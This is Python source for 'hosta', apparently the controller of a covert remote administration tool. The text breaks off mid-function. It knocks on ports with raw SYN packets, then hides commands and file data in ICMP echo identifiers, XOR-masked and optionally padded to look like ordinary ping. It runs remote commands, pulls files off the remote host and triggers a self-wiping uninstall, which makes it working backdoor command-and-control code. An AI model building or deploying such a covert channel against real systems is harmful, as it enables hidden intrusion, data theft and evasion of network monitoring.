"""hosta: control center for the remote administration tool.

Usage:
    sudo python3 hosta.py -a <hostb_ip>
"""

import argparse
import hashlib
import os
import socket
import struct
import sys
import time
from dataclasses import dataclass


KNOCK_PORTS = (7000, 8000, 9000)
KNOCK_DELAY_SECONDS = 0.1
SOURCE_PORT = 54321
TTL = 64
ACK_TIMEOUT_SECONDS = 5.0
TCP_ACK_FLAG = 0x10

# Command-channel protocol: command code goes in the ICMP identifier
# (16 bits, XOR-encrypted with the user-supplied pre-shared key derived
# via SHA-256); sequence in the ICMP sequence field in cleartext.
CMD_DISCONNECT = 1
CMD_TRANSFER_FILE = 2
CMD_UNINSTALL = 3
CMD_RUN_PROGRAM = 4
CMD_REQUEST_FILE = 5
ACK_READY = 0xFFFE
ACK_META = 0xFFFD
ACK_CHUNK = 0xFFFC
ACK_END = 0xFFFB

# Run-program limits.
MAX_COMMAND_BYTES = 0xFFFFFFFF               # command bytes use 32-bit size header
OUTPUT_TIMEOUT_SECONDS = 60.0                # wait this long for output metadata

# File transfer: chunked stop-and-wait protocol.
# Each chunk = CHUNK_PACKETS data packets carrying 2 bytes each.
# Hosta sends a chunk header (seq=CHUNK_HEADER_SEQ, identifier=chunk_index)
# followed by data packets (seq=1..CHUNK_PACKETS, identifier=2 data bytes).
# Hostb ACKs each chunk; hosta retries up to MAX_CHUNK_RETRIES on timeout.
MAX_TRANSFER_BYTES = 0xFFFFFFFF              # 32-bit file size split across 2 metadata packets
MAX_FILENAME_BYTES = 0xFFFF                  # filename length still fits one 16-bit identifier
CHUNK_PACKETS = 1024
CHUNK_BYTES = CHUNK_PACKETS * 2
CHUNK_PACKET_DELAY_SECONDS = 0.0001       # 100us pacing inside a chunk
RECV_BUFFER_BYTES = 8 * 1024 * 1024       # ask kernel for big recv buffer
READY_TIMEOUT_SECONDS = 5.0
META_ACK_TIMEOUT_SECONDS = 5.0
CHUNK_ACK_TIMEOUT_SECONDS = 5.0
CHUNK_RECV_TIMEOUT_SECONDS = 10.0            # per-attempt timeout receiving a chunk
END_ACK_TIMEOUT_SECONDS = 3.0
END_DRAIN_TIMEOUT_SECONDS = 3.0
MAX_CHUNK_RETRIES = 5

# File request: hostb reads file and streams back. Allow more time than command
# output because hostb might have to read a multi-MB file from disk first.
REQUESTED_FILE_TIMEOUT_SECONDS = 60.0
RECEIVED_DIRECTORY = "received"
RECEIVED_FALLBACK_NAME = "received_file"

# Reserved sequence values for the transfer protocol.
CHUNK_HEADER_SEQ = 0
END_SEQ = 0xFFFF
META_FILENAME_LENGTH_SEQ = 1
META_FILE_SIZE_HI_SEQ = 2
META_FILE_SIZE_LO_SEQ = 3
META_FILENAME_FIRST_SEQ = 4

# Byte-stream metadata (run-program command and output): just the 32-bit size.
STREAM_SIZE_HI_SEQ = 1
STREAM_SIZE_LO_SEQ = 2

# Mimic Linux `ping`: 8-byte timestamp slot (zeroed) + 48 bytes of the
# 0x10..0x3F filler pattern. hostb ignores this payload — it only reads
# the identifier and sequence header fields.
PING_PAYLOAD = b"\x00" * 8 + bytes(range(0x10, 0x40))

MENU_OPTIONS = (
    "Connect to hostb",
    "Disconnect from hostb",
    "Uninstall from hostb",
    "Transfer file to hostb",
    "Transfer file from hostb",
    "Watch file on hostb",
    "Watch directory on hostb",
    "Run program on hostb",
)


@dataclass
class HostaArgs:
    hostb_ip: str
    key: str


@dataclass
class Context:
    args: HostaArgs | None = None
    error_message: str | None = None
    error_code: int = 1
    destination_ip: str = ""
    source_ip: str = ""
    connected: bool = False
    key: int = 0


# ---------------------------------------------------------------------------
# Protocol helpers
# ---------------------------------------------------------------------------

def detect_source_ip(destination_ip):
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect((destination_ip, 1))
        return probe.getsockname()[0]
    finally:
        probe.close()


def compute_checksum(data):
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF


def build_ip_header(source_ip, destination_ip, total_length, protocol=socket.IPPROTO_TCP):
    def with_checksum(checksum):
        return struct.pack(
            "!BBHHHBBH4s4s",
            0x45,                     # version 4, header length 5 (20 bytes)
            0,                        # type of service
            total_length,
            0,                        # identification
            0,                        # flags + fragment offset
            TTL,
            protocol,
            checksum,
            socket.inet_aton(source_ip),
            socket.inet_aton(destination_ip),
        )
    return with_checksum(compute_checksum(with_checksum(0)))


def build_tcp_syn_header(source_ip, destination_ip, destination_port):
    def with_checksum(checksum):
        return struct.pack(
            "!HHLLBBHHH",
            SOURCE_PORT,
            destination_port,
            0,                        # sequence number
            0,                        # ack number
            0x50,                     # data offset 5 (20 bytes), reserved 0
            0x02,                     # flags: SYN only
            65535,                    # window
            checksum,
            0,                        # urgent pointer
        )
    pseudo = struct.pack(
        "!4s4sBBH",
        socket.inet_aton(source_ip),
        socket.inet_aton(destination_ip),
        0,
        socket.IPPROTO_TCP,
        20,                           # TCP header length
    )
    return with_checksum(compute_checksum(pseudo + with_checksum(0)))


def build_icmp_echo_request(identifier_encrypted, sequence):
    def with_checksum(checksum):
        header = struct.pack(
            "!BBHHH",
            8,                         # type: echo request
            0,                         # code
            checksum,
            identifier_encrypted,
            sequence,
        )
        return header
        # return header + PING_PAYLOAD  # uncomment to mimic Linux ping payload
    return with_checksum(compute_checksum(with_checksum(0)))


def derive_key(key_string):
    digest = hashlib.sha256(key_string.encode("utf-8")).digest()
    return (digest[0] << 8) | digest[1]


def encrypt_identifier(plaintext, key):
    return (plaintext ^ key) & 0xFFFF


def decrypt_identifier(ciphertext, key):
    return (ciphertext ^ key) & 0xFFFF


def open_raw_send_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    return sock


def open_raw_icmp_recv_socket():
    """Open SOCK_RAW for ICMP with a fat receive buffer so a burst of
    chunk packets won't overflow the kernel queue before Python drains it."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    force_opt = getattr(socket, "SO_RCVBUFFORCE", None)
    if force_opt is not None:
        try:
            sock.setsockopt(socket.SOL_SOCKET, force_opt, RECV_BUFFER_BYTES)
            return sock
        except OSError:
            pass
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, RECV_BUFFER_BYTES)
    except OSError:
        pass
    return sock


def send_icmp_identifier(send_socket, source_ip, destination_ip, identifier_encrypted, sequence):
    icmp = build_icmp_echo_request(identifier_encrypted, sequence)
    ip = build_ip_header(source_ip, destination_ip, 20 + len(icmp), socket.IPPROTO_ICMP)
    send_socket.sendto(ip + icmp, (destination_ip, 0))


def wait_for_ack_ready(recv_socket, source_ip, key, timeout):
    """Block until an ICMP echo from source_ip carries ACK_READY in the identifier."""
    deadline = time.time() + timeout
    while True:
        remaining = deadline - time.time()
        if remaining <= 0:
            return False
        recv_socket.settimeout(remaining)
        try:
            packet, _ = recv_socket.recvfrom(65535)
        except socket.timeout:
            return False
        if len(packet) < 28:
            continue
        ip_header_length = (packet[0] & 0x0F) * 4
        if len(packet) < ip_header_length + 8:
            continue
        if socket.inet_ntoa(packet[12:16]) != source_ip:
            continue
        icmp_header = packet[ip_header_length:ip_header_length + 8]
        icmp_type, _code, _chk, identifier, _seq = struct.unpack("!BBHHH", icmp_header)
        if icmp_type != 8:
            continue
        if decrypt_identifier(identifier, key) == ACK_READY:
            return True


def wait_for_ack(recv_socket, source_ip, key, expected_identifier, expected_sequence, timeout):
    """Wait for an ICMP echo from source_ip where the decrypted identifier matches
    expected_identifier. If expected_sequence is not None, the ICMP sequence must
    also match. Returns True on match, False on timeout."""
    deadline = time.time() + timeout
    while True:
        remaining = deadline - time.time()
        if remaining <= 0:
            return False
        recv_socket.settimeout(remaining)
        try:
            packet, _ = recv_socket.recvfrom(65535)
        except socket.timeout:
            return False
        if len(packet) < 28:
            continue
        ip_header_length = (packet[0] & 0x0F) * 4
        if len(packet) < ip_header_length + 8:
            continue
        if socket.inet_ntoa(packet[12:16]) != source_ip:
            continue
        icmp_header = packet[ip_header_length:ip_header_length + 8]
        icmp_type, _code, _chk, identifier, sequence = struct.unpack("!BBHHH", icmp_header)
        if icmp_type != 8:
            continue
        if decrypt_identifier(identifier, key) != expected_identifier:
            continue
        if expected_sequence is not None and sequence != expected_sequence:
            continue
        return True


def send_chunk(send_socket, source_ip, destination_ip, key, chunk_index, chunk_bytes):
    """Send one chunk: header packet (seq=CHUNK_HEADER_SEQ, id=chunk_index)
    followed by data packets seq=1..N each carrying two file bytes.
    A tiny per-packet delay keeps us from overrunning the device queue
    on the sender or the recv socket buffer on the receiver."""
    send_icmp_identifier(
        send_socket, source_ip, destination_ip,
        encrypt_identifier(chunk_index, key), CHUNK_HEADER_SEQ,
    )
    if CHUNK_PACKET_DELAY_SECONDS > 0:
        time.sleep(CHUNK_PACKET_DELAY_SECONDS)
    chunk_length = len(chunk_bytes)
    num_packets = (chunk_length + 1) // 2
    for packet_index in range(num_packets):
        byte_offset = packet_index * 2
        high = chunk_bytes[byte_offset]
        low = chunk_bytes[byte_offset + 1] if byte_offset + 1 < chunk_length else 0
        word = (high << 8) | low
        send_icmp_identifier(
            send_socket, source_ip, destination_ip,
            encrypt_identifier(word, key), packet_index + 1,
        )
        if CHUNK_PACKET_DELAY_SECONDS > 0:
            time.sleep(CHUNK_PACKET_DELAY_SECONDS)


def _read_icmp_echo(recv_socket, source_ip, remaining):
    """Block up to `remaining` seconds for one ICMP echo request from source_ip.
    Returns (sequence, identifier) on a matching packet, None on timeout, or ()
    on a packet that didn't match (caller should keep looping)."""
    if remaining <= 0:
        return None
    recv_socket.settimeout(remaining)
    try:
        packet, _ = recv_socket.recvfrom(65535)
    except socket.timeout:
        return None
    if len(packet) < 28:
        return ()
    ip_header_length = (packet[0] & 0x0F) * 4
    if len(packet) < ip_header_length + 8:
        return ()
    if socket.inet_ntoa(packet[12:16]) != source_ip:
        return ()
    icmp_header = packet[ip_header_length:ip_header_length + 8]
    icmp_type, _code, _chk, identifier, sequence = struct.unpack("!BBHHH", icmp_header)
    if icmp_type != 8:
        return ()
    return sequence, identifier


def send_ack(send_socket, source_ip, destination_ip, key, identifier_sentinel, sequence=1):
    icmp = build_icmp_echo_request(encrypt_identifier(identifier_sentinel, key), sequence)
    ip = build_ip_header(source_ip, destination_ip, 20 + len(icmp), socket.IPPROTO_ICMP)
    send_socket.sendto(ip + icmp, (destination_ip, 0))


def receive_chunk(recv_socket, send_socket, source_ip, my_ip, key,
                  expected_chunk_index, expected_packets, chunks_written, timeout):
    """Collect one chunk's data packets. Returns (bytes, None) on success or
    (None, missing_count) on timeout. Mirrors hostb.receive_chunk."""
    packets: dict[int, int] = {}
    saw_header = False
    deadline = time.time() + timeout

    while True:
        remaining = deadline - time.time()
        result = _read_icmp_echo(recv_socket, source_ip, remaining)
        if result is None:
            return None, expected_packets - len(packets)
        if result == ():
            continue
        sequence, identifier = result
        value = decrypt_identifier(identifier, key)

        if sequence == CHUNK_HEADER_SEQ:
            chunk_index = value
            if chunk_index in chunks_written:
                send_ack(send_socket, my_ip, source_ip, key, ACK_CHUNK, sequence=chunk_index)
                continue
            if chunk_index != expected_chunk_index:
                continue
            packets = {}
            saw_header = True
            deadline = time.time() + timeout
            continue

        if not saw_header:
            continue
        if 1 <= sequence <= expected_packets:
            packets[sequence] = value
            if len(packets) >= expected_packets:
                out = bytearray()
                for i in range(1, expected_packets + 1):
                    v = packets.get(i)
                    if v is None:
                        return None, expected_packets - len(packets)
                    out.append((v >> 8) & 0xFF)
                    out.append(v & 0xFF)
                return bytes(out), None


def drain_for_end(recv_socket, send_socket, source_ip, my_ip, key, chunks_written, timeout):
    """Brief listen window after the last chunk: ACK the END marker if it
    arrives, and re-ACK any in-flight duplicate chunk headers."""
    deadline = time.time() + timeout
    while True:
        remaining = deadline - time.time()
        result = _read_icmp_echo(recv_socket, source_ip, remaining)
        if result is None:
            return
        if result == ():
            continue
        sequence, identifier = result
        value = decrypt_identifier(identifier, key)
        if sequence == END_SEQ:
            send_ack(send_socket, my_ip, source_ip, key, ACK_END)
            return
        if sequence == CHUNK_HEADER_SEQ and value in chunks_written:
            send_ack(send_socket, my_ip, source_ip, key, ACK_CHUNK, sequence=value)


def receive_byte_metadata(recv_socket, source_ip, key, timeout):
    """Receive the 2-packet byte-stream metadata (seq=1 size_hi, seq=2 size_lo).
    Returns the 32-bit byte count or None on timeout."""
    packets: dict[int, int] = {}
    deadline = time.time() + timeout
    while True:
        remaining = deadline - time.time()
        result = _read_icmp_echo(recv_socket, source_ip, remaining)
        if result is None:
            return None
        if result == ():
            continue
        sequence, identifier = result
        if sequence in (STREAM_SIZE_HI_SEQ, STREAM_SIZE_LO_SEQ):
            packets[sequence] = decrypt_identifier(identifier, key)
            if STREAM_SIZE_HI_SEQ in packets and STREAM_SIZE_LO_SEQ in packets:
                return (packets[STREAM_SIZE_HI_SEQ] << 16) | packets[STREAM_SIZE_LO_SEQ]


def send_byte_stream_chunked(send_socket, recv_socket, my_ip, peer_ip, key, payload):
    """Send `payload` to peer using the chunk+ACK protocol.
    Sequence: metadata (size_hi, size_lo) -> wait ACK_META -> per-chunk
    send+wait ACK_CHUNK with retries -> fire-and-forget END -> wait ACK_END.
    Returns True on success, False otherwise (no exception raised)."""
    byte_count = len(payload)
    byte_count_hi = (byte_count >> 16) & 0xFFFF
    byte_count_lo = byte_count & 0xFFFF
    try:
        send_icmp_identifier(send_socket, my_ip, peer_ip,
                             encrypt_identifier(byte_count_hi, key), STREAM_SIZE_HI_SEQ)
        send_icmp_identifier(send_socket, my_ip, peer_ip,
                             encrypt_identifier(byte_count_lo, key), STREAM_SIZE_LO_SEQ)
    except OSError:
        return False
    if not wait_for_ack(recv_socket, peer_ip, key, ACK_META, None, META_ACK_TIMEOUT_SECONDS):
        return False

    total_chunks = 0 if byte_count == 0 else (byte_count + CHUNK_BYTES - 1) // CHUNK_BYTES
    for chunk_index in range(total_chunks):
        chunk_start = chunk_index * CHUNK_BYTES
        chunk_data = payload[chunk_start:chunk_start + CHUNK_BYTES]
        acked = False
        for attempt in range(1, MAX_CHUNK_RETRIES + 1):
            try:
                send_chunk(send_socket, my_ip, peer_ip, key, chunk_index, chunk_data)
            except OSError:
                return False
            if wait_for_ack(recv_socket, peer_ip, key, ACK_CHUNK, chunk_index,
                            CHUNK_ACK_TIMEOUT_SECONDS):
                acked = True
                break
            print(f"  chunk {chunk_index} ack timed out (attempt {attempt}/{MAX_CHUNK_RETRIES})")
        if not acked:
            return False

    try:
        send_icmp_identifier(send_socket, my_ip, peer_ip,
                             encrypt_identifier(0, key), END_SEQ)
    except OSError:
        pass
    wait_for_ack(recv_socket, peer_ip, key, ACK_END, None, END_ACK_TIMEOUT_SECONDS)
    return True


def receive_byte_stream_chunked(recv_socket, send_socket, my_ip, peer_ip, key, metadata_timeout):
    """Receive a chunked byte stream. Sender must already be past any preceding
    handshake. Returns the assembled bytes or None on failure."""
    byte_count = receive_byte_metadata(recv_socket, peer_ip, key, metadata_timeout)
    if byte_count is None:
        return None
    try:
        send_ack(send_socket, my_ip, peer_ip, key, ACK_META)
    except OSError:
        return None

    output = bytearray()
    total_chunks = 0 if byte_count == 0 else (byte_count + CHUNK_BYTES - 1) // CHUNK_BYTES
    chunks_written: set[int] = set()
    for chunk_index in range(total_chunks):
        chunk_byte_count = min(CHUNK_BYTES, byte_count - chunk_index * CHUNK_BYTES)
        expected_packets = (chunk_byte_count + 1) // 2
        chunk_bytes, missing = receive_chunk(
            recv_socket, send_socket, peer_ip, my_ip, key,
            chunk_index, expected_packets, chunks_written, CHUNK_RECV_TIMEOUT_SECONDS,
        )
        if chunk_bytes is None:
            print(f"  output chunk {chunk_index} receive failed "
                  f"(missing {missing}/{expected_packets} packets)")
            return None
        output.extend(chunk_bytes[:chunk_byte_count])
        chunks_written.add(chunk_index)
        try:
            send_ack(send_socket, my_ip, peer_ip, key, ACK_CHUNK, sequence=chunk_index)
        except OSError:
            return None

    drain_for_end(recv_socket, send_socket, peer_ip, my_ip, key,
                  chunks_written, END_DRAIN_TIMEOUT_SECONDS)
    return bytes(output)


# ---------------------------------------------------------------------------
# FSM state functions
# ---------------------------------------------------------------------------

def handle_error(ctx: Context):
    sys.stderr.write(f"\nError: {ctx.error_message}\n")
    sys.stderr.write(f"Exit Code: {ctx.error_code}\n")
    sys.exit(ctx.error_code)


def parse_arguments(ctx: Context, argv: list[str] | None = None):
    parser = argparse.ArgumentParser(
        prog="hosta",
        description="Control center for the remote administration tool.",
    )
    parser.add_argument("-a", "--address", dest="hostb_ip", required=True,
                        metavar="<hostb_ip>",
                        help="IP address of hostb")
    parser.add_argument("-k", "--key", dest="key", required=True,
                        metavar="<key>",
                        help="pre-shared key string (must match hostb)")

    try:
        parsed = parser.parse_args(argv)
    except SystemExit as exc:
        sys.exit(1 if exc.code else 0)

    ctx.args = HostaArgs(hostb_ip=parsed.hostb_ip, key=parsed.key)


def handle_arguments(ctx: Context):
    try:
        socket.inet_aton(ctx.args.hostb_ip)
    except OSError:
        ctx.error_message = f"invalid ip address: {ctx.args.hostb_ip}"
        handle_error(ctx)
    if not ctx.args.key:
        ctx.error_message = "key must be a non-empty string"
        handle_error(ctx)
    ctx.destination_ip = ctx.args.hostb_ip
    ctx.key = derive_key(ctx.args.key)


def display_menu(ctx: Context) -> str:
    state_label = "connected" if ctx.connected else "disconnected"
    print(f"\n--- Menu ({state_label}) ---")
    for index, label in enumerate(MENU_OPTIONS, start=1):
        print(f"  {index}) {label}")
    try:
        return input("choice> ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return "exit"


def establish_session(ctx: Context):
    if ctx.connected:
        print("Already connected.")
        return

    ctx.source_ip = detect_source_ip(ctx.destination_ip)

    # Open the recv socket first so we don't miss an ack that arrives
    # before we finish sending the knocks.
    try:
        recv_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        send_socket = open_raw_send_socket()
    except PermissionError:
        ctx.error_message = "permission denied (raw sockets require sudo)"
        handle_error(ctx)

    try:
        print(f"Knocking {ctx.destination_ip} from {ctx.source_ip}")
        for index, port in enumerate(KNOCK_PORTS):
            if index > 0:
                time.sleep(KNOCK_DELAY_SECONDS)
            tcp = build_tcp_syn_header(ctx.source_ip, ctx.destination_ip, port)
            ip = build_ip_header(ctx.source_ip, ctx.destination_ip, 20 + len(tcp))
            send_socket.sendto(ip + tcp, (ctx.destination_ip, port))
            print(f"  SYN -> {ctx.destination_ip}:{port}")

        print("Waiting for ack...")
        deadline = time.time() + ACK_TIMEOUT_SECONDS
        while True:
            remaining = deadline - time.time()
            if remaining <= 0:
                print("Connection failed: no ack from hostb.")
                return
            recv_socket.settimeout(remaining)
            try:
                packet, _ = recv_socket.recvfrom(65535)
            except socket.timeout:
                print("Connection failed: no ack from hostb.")
                return

            if len(packet) < 40:
                continue
            ip_header_length = (packet[0] & 0x0F) * 4
            if len(packet) < ip_header_length + 20:
                continue
            if socket.inet_ntoa(packet[12:16]) != ctx.destination_ip:
                continue

            tcp_header = packet[ip_header_length:ip_header_length + 20]
            _, dst_port, _, _, _, flags, _, _, _ = struct.unpack("!HHLLBBHHH", tcp_header)
            if dst_port != SOURCE_PORT:
                continue
            if flags & TCP_ACK_FLAG:
                print("Connection established.")
                ctx.connected = True
                return
    finally:
        recv_socket.close()
        send_socket.close()


def send_command(ctx: Context, command_code: int):
    if not ctx.connected:
        print("Not connected. Use option 1 first.")
        return

    try:
        raw_socket = open_raw_send_socket()
    except PermissionError:
        ctx.error_message = "permission denied (raw sockets require sudo)"
        handle_error(ctx)

    try:
        identifier = encrypt_identifier(command_code, ctx.key)
        sequence = 1
        try:
            send_icmp_identifier(raw_socket, ctx.source_ip, ctx.destination_ip, identifier, sequence)
        except OSError as exc:
            ctx.error_message = f"failed to send command: {exc}"
            ctx.error_code = 2
            handle_error(ctx)

        print(
            f"ICMP -> {ctx.destination_ip} "
            f"id={identifier:#06x} (cmd={command_code}) seq={sequence}"
        )
        if command_code == CMD_DISCONNECT:
            ctx.connected = False
            print("Disconnect command sent.")
        elif command_code == CMD_UNINSTALL:
            ctx.connected = False
            print("Uninstall command sent. hostb should now wipe its directory and exit.")
    finally:
        raw_socket.close()


def transfer_file(ctx: Context):
    if not ctx.connected:
        print("Not connected. Use option 1 first.")
        return

    try:
        source_path = input("file path> ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return
    if not source_path:
        print("Transfer cancelled: no path given.")
        return

    try:
        with open(source_path, "rb") as f:
            file_bytes = f.read()
    except FileNotFoundError:
        print(f"Transfer failed: file not found: {source_path}")
        return
    except (IsADirectoryError, PermissionError) as exc:
        print(f"Transfer failed: cannot read {source_path}: {exc}")
        return
    except OSError as exc:
        print(f"Transfer failed: cannot read {source_path}: {exc}")
        return

    file_size = len(file_bytes)
    if file_size == 0:
        print(f"Transfer skipped: {source_path} is empty.")
        return
    if file_size > MAX_TRANSFER_BYTES:
        print(f"Transfer failed: file too large ({file_size} bytes, max {MAX_TRANSFER_BYTES}).")
        return

    filename = os.path.basename(source_path)
    filename_bytes = filename.encode("utf-8")
    filename_length = len(filename_bytes)
    if filename_length == 0 or filename_length > MAX_FILENAME_BYTES:
        print(f"Transfer failed: invalid filename '{filename}' ({filename_length} bytes)")
        return

    total_chunks = (file_size + CHUNK_BYTES - 1) // CHUNK_BYTES
    num_filename_packets = (filename_length + 1) // 2
    print(f"File: {source_path}")
    print(f"  Name:     '{filename}' ({filename_length} bytes, {num_filename_packets} packets)")
    print(f"  Contents: {file_size} bytes in {total_chunks} chunks of up to {CHUNK_BYTES} bytes")

    # Open the ICMP recv socket first so we don't miss any acks.
    try:
        recv_socket = open_raw_icmp_recv_socket()
        send_socket = open_raw_send_socket()
    except PermissionError:
        ctx.error_message = "permission denied (raw sockets require sudo)"
        handle_error(ctx)

    try:
        # Phase A: transfer request -> wait for ACK_READY.
        try:
            send_icmp_identifier(
                send_socket, ctx.source_ip, ctx.destination_ip,
                encrypt_identifier(CMD_TRANSFER_FILE, ctx.key), 1,
            )
        except OSError as exc:
            ctx.error_message = f"failed to send transfer request: {exc}"
            ctx.error_code = 2
            handle_error(ctx)
        print(f"Sent transfer request (cmd={CMD_TRANSFER_FILE}). Waiting for ready ack...")

        if not wait_for_ack(recv_socket, ctx.destination_ip, ctx.key,
                            ACK_READY, None, READY_TIMEOUT_SECONDS):
            print("Transfer failed: no ready ack from hostb.")
            return
        print("hostb is ready. Sending metadata...")

        # Phase B: metadata (filename length, file size hi/lo, filename bytes) -> ACK_META.
        file_size_hi = (file_size >> 16) & 0xFFFF
        file_size_lo = file_size & 0xFFFF
        try:
            send_icmp_identifier(
                send_socket, ctx.source_ip, ctx.destination_ip,
                encrypt_identifier(filename_length, ctx.key), META_FILENAME_LENGTH_SEQ,
            )
            send_icmp_identifier(
                send_socket, ctx.source_ip, ctx.destination_ip,
                encrypt_identifier(file_size_hi, ctx.key), META_FILE_SIZE_HI_SEQ,
            )
            send_icmp_identifier(
                send_socket, ctx.source_ip, ctx.destination_ip,
                encrypt_identifier(file_size_lo, ctx.key), META_FILE_SIZE_LO_SEQ,
            )
            for packet_index in range(num_filename_packets):
                byte_offset = packet_index * 2
                high = filename_bytes[byte_offset]
                low = filename_bytes[byte_offset + 1] if byte_offset + 1 < filename_length else 0
                word = (high << 8) | low
                send_icmp_identifier(
                    send_socket, ctx.source_ip, ctx.destination_ip,
                    encrypt_identifier(word, ctx.key),
                    META_FILENAME_FIRST_SEQ + packet_index,
                )
        except OSError as exc:
            ctx.error_message = f"failed to send metadata: {exc}"
            ctx.error_code = 2
            handle_error(ctx)

        if not wait_for_ack(recv_socket, ctx.destination_ip, ctx.key,
                            ACK_META, None, META_ACK_TIMEOUT_SECONDS):
            print("Transfer failed: no metadata ack from hostb.")
            return
        print(f"Metadata acked. Sending {total_chunks} chunk(s)...")

        # Phase C: stop-and-wait chunk loop.
        for chunk_index in range(total_chunks):
            chunk_start = chunk_index * CHUNK_BYTES
            chunk_data = file_bytes[chunk_start:chunk_start + CHUNK_BYTES]

            acked = False
            for attempt in range(1, MAX_CHUNK_RETRIES + 1):
                try:
                    send_chunk(send_socket, ctx.source_ip, ctx.destination_ip,
                               ctx.key, chunk_index, chunk_data)
                except OSError as exc:
                    ctx.error_message = f"failed to send chunk {chunk_index}: {exc}"
                    ctx.error_code = 2
                    handle_error(ctx)

                if wait_for_ack(recv_socket, ctx.destination_ip, ctx.key,
                                ACK_CHUNK, chunk_index, CHUNK_ACK_TIMEOUT_SECONDS):
                    acked = True
                    break
                print(f"  chunk {chunk_index} ack timed out (attempt {attempt}/{MAX_CHUNK_RETRIES})")

            if not acked:
                print(f"Transfer failed: chunk {chunk_index} not acked after "
                      f"{MAX_CHUNK_RETRIES} attempts; giving up.")
                return
            print(f"  chunk {chunk_index + 1}/{total_chunks} acked ({len(chunk_data)} bytes)")

        # Phase D: fire-and-forget END marker.
        try:
            send_icmp_identifier(
                send_socket, ctx.source_ip, ctx.destination_ip,
                encrypt_identifier(0, ctx.key), END_SEQ,
            )
        except OSError as exc:
            print(f"Warning: failed to send END marker: {exc}")
        wait_for_ack(recv_socket, ctx.destination_ip, ctx.key,
                     ACK_END, None, END_ACK_TIMEOUT_SECONDS)

        print(f"Transfer complete: {file_size} bytes in {total_chunks} chunk(s).")
    finally:
        recv_socket.close()
        send_socket.close()


def request_file(ctx: Context):
    if not ctx.connected:
        print("Not connected. Use option 1 first.")
        return

    try:
        remote_path = input("hostb file path> ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return
    if not remote_path:
        print("Request cancelled: no path given.")
        return

    path_bytes = remote_path.encode("utf-8")
    if len(path_bytes) > MAX_FILENAME_BYTES:
        print(f"Request failed: path too long ({len(path_bytes)} bytes).")
        return

    print(f"Requesting from hostb: {remote_path}")

    try:
        recv_socket = open_raw_icmp_recv_socket()
        send_socket = open_raw_send_socket()
    except PermissionError:
        ctx.error_message = "permission denied (raw sockets require sudo)"
        handle_error(ctx)

    try:
        # Phase A: request -> wait for ACK_READY.
        try:
            send_icmp_identifier(
                send_socket, ctx.source_ip, ctx.destination_ip,
                encrypt_identifier(CMD_REQUEST_FILE, ctx.key), 1,
            )
        except OSError as exc:
            ctx.error_message = f"failed to send request: {exc}"
            ctx.error_code = 2
            handle_error(ctx)
        print(f"Sent request (cmd={CMD_REQUEST_FILE}). Waiting for ready ack...")

        if not wait_for_ack_ready(recv_socket, ctx.destination_ip, ctx.key,
                                  READY_TIMEOUT_SECONDS):
            print("Request failed: no ready ack from hostb.")
            return
        print("hostb is ready. Sending path...")

        # Phase B: send the requested path as a byte stream.
        if not send_byte_stream_chunked(send_socket, recv_socket,
                                        ctx.source_ip, ctx.destination_ip,
                                        ctx.key, path_bytes):
            print("Request failed: path send aborted.")
            return
        print("Path sent. Waiting for file...")

        # Phase C: receive the file bytes.
        file_bytes = receive_byte_stream_chunked(
            recv_socket, send_socket, ctx.source_ip, ctx.destination_ip,
            ctx.key, REQUESTED_FILE_TIMEOUT_SECONDS,
        )
        if file_bytes is None:
            print("Request failed: file receive aborted.")
            return
        if len(file_bytes) == 0:
            print("Request failed: hostb reported the file is missing or unreadable.")
            return

        basename = os.path.basename(remote_path.replace("\\", "/"))
        if not basename or basename in (".", "..") or "\x00" in basename:
            basename = RECEIVED_FALLBACK_NAME
        output_path = os.path.join(RECEIVED_DIRECTORY, basename)
        try:
            os.makedirs(RECEIVED_DIRECTORY, exist_ok=True)
            with open(output_path, "wb") as f:
                f.write(file_bytes)
        except OSError as exc:
            ctx.error_message = f"failed to write {output_path}: {exc}"
            ctx.error_code = 2
            handle_error(ctx)
        print(f"Received {output_path} ({len(file_bytes)} bytes)")
    finally:
        recv_socket.close()
        send_socket.close()


def run_program(ctx: Context):
    if not ctx.connected:
        print("Not connected. Use option 1 first.")
        return

    try:
        command_text = input("command> ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return
    if not command_text:
        print("Run cancelled: no command given.")
        return

    command_bytes = command_text.encode("utf-8")
    command_length = len(command_bytes)
    if command_length > MAX_COMMAND_BYTES:
        print(f"Run failed: command too long ({command_length} bytes, max {MAX_COMMAND_BYTES}).")
        return

    print(f"Command: {command_text!r} ({command_length} bytes)")

    try:
        recv_socket = open_raw_icmp_recv_socket()
        send_socket = open_raw_send_socket()
    except PermissionError:
        ctx.error_message = "permission denied (raw sockets require sudo)"
        handle_error(ctx)

    try:
        # Phase A: run request -> wait for ACK_READY.
        try:
            send_icmp_identifier(
                send_socket, ctx.source_ip, ctx.destination_ip,
                encrypt_identifier(CMD_RUN_PROGRAM, ctx.key), 1,
            )
        except OSError as exc:
            ctx.error_message = f"failed to send run request: {exc}"
            ctx.error_code = 2
            handle_error(ctx)
        print(f"Sent run request (cmd={CMD_RUN_PROGRAM}). Waiting for ready ack...")

        if not wait_for_ack_ready(recv_socket, ctx.destination_ip, ctx.key,
                                  READY_TIMEOUT_SECONDS):
            print("Run failed: no ready ack from hostb.")
            return
        print("hostb is ready. Sending command...")

        if not send_byte_stream_chunked(send_socket, recv_socket,
                                        ctx.source_ip, ctx.destination_ip,
                                        ctx.key, command_bytes):
            print("Run failed: command send aborted.")
            return
        print("Command sent. Waiting for output...")

        output_bytes = receive_byte_stream_chunked(
            recv_socket, send_socket, ctx.source_ip, ctx.destination_ip,
            ctx.key, OUTPUT_TIMEOUT_SECONDS,
        )
        if output_bytes is None:
            print("Run failed: timed out or incomplete output from hostb.")
            return

        try:
            output_text = output_bytes.decode("utf-8")
        except UnicodeDecodeError:
